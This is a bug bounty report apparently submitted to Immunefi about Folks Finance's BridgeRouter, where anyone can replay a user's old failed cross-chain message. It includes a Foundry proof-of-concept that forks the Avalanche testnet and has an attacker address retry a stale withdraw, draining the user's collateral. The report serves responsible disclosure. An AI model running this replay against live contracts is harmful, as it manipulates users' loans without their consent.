# Boost \_ Folks Finance 34150 - \[Smart Contract - Low] Failed messages never expire and can be replaye

Submitted on Tue Aug 06 2024 02:16:38 GMT-0400 (Atlantic Standard Time) by @JCN2023 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #34150

Report type: Smart Contract

Report severity: Low

Target: <https://testnet.snowtrace.io/address/0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Bug Description

When a user's transaction fails on the `Hub` chain, it will be stored as a failed message in the `BridgeRouter`:

[BridgeRouter::receiveMessage](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/bridge/BridgeRouter.sol#L94-L123)

```solidity
127:    function receiveMessage(Messages.MessageReceived memory message) external payable override {
...
115:        // call handler with received payload
116:        try BridgeMessenger(handler).receiveMessage(message) {
117:            // emit message received as suceeded
118:            emit MessageSucceeded(adapterId, message.messageId);
119:        } catch (bytes memory err) {
120:            // don't revert so GMP doesn't revert
121:            // store and emit message received as failed
122:            failedMessages[adapterId][message.messageId] = message; // store failed message
123:            emit MessageFailed(adapterId, message.messageId, err);
```

The message can then be retried at anytime via the same `BridgeRouter`:

[BridgeRouter::retryMessage](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/bridge/BridgeRouter.sol#L127-L150)

```solidity
127:    function retryMessage(uint16 adapterId, bytes32 messageId) external payable {
128:        // get failed message if known
129:        Messages.MessageReceived memory message = _getFailedMessage(adapterId, messageId);
130:
131:        // convert handler to address type (from lower 20 bytes)
132:        address handler = Messages.convertGenericAddressToEVMAddress(message.handler);
...
140:        // clear failure before call to handler
141:        delete failedMessages[adapterId][message.messageId];
142:
143:        // call handler with received payload
144:        try BridgeMessenger(handler).receiveMessage(message) {
145:            // emit message retry as suceeded
146:            emit MessageRetrySucceeded(adapterId, message.messageId);
147:        } catch (bytes memory err) {
148:            // store and emit message retry as failed
149:            failedMessages[adapterId][message.messageId] = message;
150:            emit MessageRetryFailed(adapterId, message.messageId, err);
```

As we can see above, the `msg.sender` of the `retryMessage` transactions is not validated. Therefore, anyone is able to retry a failed message at anytime.

## Impact

Bad actors can retry user's old, failed messages. This will allow the user's loan to potentially be manipulated without their knowledge. For example, an old withdraw or borrow transaction can be retried, forcing the user to redeposit their collateral or repay their unexpected borrow position. Failed messages would likely be a result of user error, but can also be temporal (cap reached). In these cases, users may opt to simply submit a new transaction with more optimal arguments in order to have a successful tx.

The conditions of this exploit requires users to have old failed messages that were never retried. Additionally, the failed message is not guaranteed to succeed at any future time. Based on these pre-conditions, I have chosen to mark the severity of this report as low.

## Recommended Mitigation

I would recommend decoding the `message.payload` during the `retryMessage` transaction and validating that the `msg.sender` is an authorized address for the `accountId` of the message.

## Proof of concept

## Proof of Concept

To run foundry POC:

* add test file to `test/` directory of a foundry repo
* add `AVAX_FUJI_RPC_URL` variable as environment var or in `.env` file
* run test with `forge test --mc FolksPOC_GriefUserByFailedTransaction`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHUB {
    function loanManager() external view returns (address);
}

interface IHubAdapter {
    function sequence() external view returns (uint256);
}

interface ISpoke {
    struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
    }

    function deposit(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint256 amount) external payable;
    function createAccount(MessageParams memory params, bytes32 accountId, bytes32 refAccountId) external payable;
    function createLoan(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint16 loanTypeId, bytes32 loanName) external payable;
    function withdraw(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint8 poolId, uint16 chainId, uint256 amount, bool isFAmount) external payable;
}

interface ILoanManager {
    struct UserLoanCollateral {
        uint256 balance; 
        uint256 rewardIndex;
    }

    struct UserLoanBorrow {
        uint256 amount; 
        uint256 balance; 
        uint256 lastInterestIndex;
        uint256 stableInterestRate; 
        uint256 lastStableUpdateTimestamp; 
        uint256 rewardIndex;
    }

    function getUserLoan(bytes32 loanId) external view returns (
        bytes32,
        uint16,
        uint8[] memory,
        uint8[] memory,
        UserLoanCollateral[] memory,
        UserLoanBorrow[] memory
    );
}

interface IBridgeRouter {
    function retryMessage(uint16 adapterId, bytes32 messageId) external payable;
}

contract FolksPOC_GriefUserByFailedTransaction is Test {
    uint256 avaxTestnetFork;

    string AVAX_FUJI_RPC_URL = vm.envString("AVAX_FUJI_RPC_URL");

    address constant USDC = 0x5425890298aed601595a70AB815c96711a31Bc65;

    address constant HUB_ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;

    address constant HUB = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140;

    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;

    address constant SPOKE_CIRCLE_TOKEN = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;

    address BRIDGE_ROUTER = 0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837;

    event MessageFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);

    function setUp() public {
        avaxTestnetFork = vm.createFork(AVAX_FUJI_RPC_URL);

        vm.selectFork(avaxTestnetFork);
    }

    function testGriefUserWithFailedMessages() public {
        // Note: test below done to demonstrate scenario in which a user has a forgotten failed transaction
        // that is retried again in the future by a bad actor and as a result the user is griefed

        // set up bad actor
        address badActor = address(0x69420);
        
        // set up user account and loan
        address user = address(0x1111);
        deal(USDC, user, 200e6);

        ISpoke.MessageParams memory params = ISpoke.MessageParams({ 
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });
        bytes32 accountId = keccak256(abi.encodePacked(user));
        bytes32 loanId = keccak256(abi.encodePacked(user, accountId));

        vm.startPrank(user);
        ISpoke(SPOKE_COMMON).createAccount(params, accountId, bytes32(0));
        ISpoke(SPOKE_COMMON).createLoan(params, accountId, loanId, uint16(2), bytes32(0)); 

        // user deposits collateral
        IERC20(USDC).approve(SPOKE_CIRCLE_TOKEN, 100e6);
        ISpoke(SPOKE_CIRCLE_TOKEN).deposit(params, accountId, loanId, 100e6);

        ILoanManager loanManager = ILoanManager(IHUB(HUB).loanManager());

        ILoanManager.UserLoanCollateral[] memory collaterals;

        (, , , , collaterals, ) = ILoanManager(loanManager).getUserLoan(loanId);
        uint256 fTokensReceived = collaterals[0].balance;

        // user attempts to withdraw, but message fails 
        // for sake of testing we will force a failed message via withdrawing too much
        bytes32 messageId = keccak256(abi.encodePacked(bytes32("HUB_ADAPTER_V1"), IHubAdapter(HUB_ADAPTER).sequence()));
        bytes memory reason = abi.encodeWithSelector(bytes4(keccak256("Panic(uint256)")), uint256(0x11)); // underflow, withdrawing too much

        vm.expectEmit(true, false, false, true); // indicates message failed
        emit MessageFailed(
            params.adapterId, 
            messageId,
            reason
        ); 
        ISpoke(SPOKE_COMMON).withdraw(params, accountId, loanId, 128, 1, 101e6, false);

        // user submits a new withdraw transaction to withdraw all funds
        ISpoke(SPOKE_COMMON).withdraw(params, accountId, loanId, 128, 1, fTokensReceived, true);

        // time passes and user deposits more
        uint256 userBal = IERC20(USDC).balanceOf(user);

        IERC20(USDC).approve(SPOKE_CIRCLE_TOKEN, userBal);

        ISpoke(SPOKE_CIRCLE_TOKEN).deposit(params, accountId, loanId, userBal);

        vm.stopPrank();

        (, , , , collaterals, ) = ILoanManager(loanManager).getUserLoan(loanId);

        uint256 userCollateralBalanceBefore = collaterals[0].balance;

        // bad actor retries user's old, failed `withdraw` transaction
        vm.prank(badActor);
        IBridgeRouter(BRIDGE_ROUTER).retryMessage(params.adapterId, messageId);

        // validate bad actor has withdrawn user collateral on their behalf
        (, , , , collaterals, ) = ILoanManager(loanManager).getUserLoan(loanId);

        uint256 userCollateralBalanceAfter = collaterals[0].balance;

        assertLt(userCollateralBalanceAfter, userCollateralBalanceBefore);
    }
}
```
